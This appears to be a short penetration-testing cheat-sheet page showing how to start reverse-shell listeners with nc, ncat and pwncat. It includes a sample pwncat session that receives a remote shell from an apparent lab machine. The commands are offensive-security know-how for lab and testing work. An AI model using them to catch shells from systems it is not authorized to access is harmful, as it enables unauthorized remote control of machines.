---
title: "Listeners"
date: 2024-6-26
tags: ["Ncat", "Listener", "Reverse Shell", "Nc", "Pwncat"]
---

### Listener Tools

{{< tab set1 tab1 active >}}nc{{< /tab >}}
{{< tab set1 tab2 >}}ncat{{< /tab >}}
{{< tab set1 tab3 >}}pwncat{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
rlwrap nc -lvnp <LOCAL_PORT>
```

```console {class="sample-code"}
$ rlwrap nc -lvnp 1337  
listening on [any] 1337 ...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Default listening on both ipv4 and ipv6
rlwrap ncat -lvnp <LOCAL_PORT>
```

```console {class="sample-code"}
$ rlwrap ncat -lvnp 1337
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
pwncat-cs -lp <LOCAL_PORT>
```

```console
# After getting a connection
back
```

```console {class="sample-code"}
$ pwncat-cs -lp 1337       
[11:43:14] Welcome to pwncat 🐈!                                                         __main__.py:164
[11:43:25] received connection from 10.10.10.55:33496                                         bind.py:84
[11:43:27] 10.10.10.55:33496: registered new host w/ db                                   manager.py:957
(local) pwncat$ back
(remote) atanas@kotarak-dmz:/$ 
```

<small>*Ref: [pwncat](https://github.com/calebstewart/pwncat)*</small>

{{< /tabcontent >}}
